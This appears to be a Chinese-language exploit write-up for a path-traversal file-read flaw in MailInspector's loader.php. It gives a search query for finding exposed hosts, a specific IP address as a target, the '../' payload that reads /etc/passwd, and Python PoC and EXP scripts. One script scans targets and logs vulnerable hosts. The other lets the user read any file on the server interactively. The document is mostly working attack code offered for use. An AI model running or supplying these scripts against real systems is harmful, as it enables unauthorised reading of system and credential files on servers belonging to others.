## 一、资产搜索

```
body="mailinspector/public"
```

## 二、网站测试

```
https://187.63.160.15
```

## 三、验证漏洞

```
/mailinspector/public/loader.php?path=../../../../../../../etc/passwd
```

![image-20240914173205415](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914173205415.png)

## 四、POC

```
def poc(target):
    payload = "/mailinspector/public/loader.php?path=../../../../../../../etc/passwd"
    res1 = requests.get(url=target,verify=False,timeout=5)
    if res1.status_code == 200:
        res2 = requests.get(url=target+payload,verify=False,timeout=5)
        if "root" in res2.text:
            with open("result.txt","a",encoding='utf-8') as f:
                f.write(f"[+]{target}\n")
                f.close()
                print(f"[+]{target}存在文件读取漏洞")
                return True
        else:
            print(f"[-]{target}不存在文件读取漏洞")
    else:
        print("访问超时，请手动测试！！！")
```

## 五、EXP

```
def exp(target):
    while True:
        content = input("请输入要查看的路径，从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>")
        payload = "/mailinspector/public/loader.php?path=../../../../../../.."
        res1 = requests.get(url=target, verify=False,timeout=5)
        if content == "q":
            exit()
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload +content, verify=False, timeout=5)
            print(res2.text)
        else:
            print("该文件不存在，请重新输入！！")
```

## 六、测试结果

![image-20240914173735842](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914173735842.png)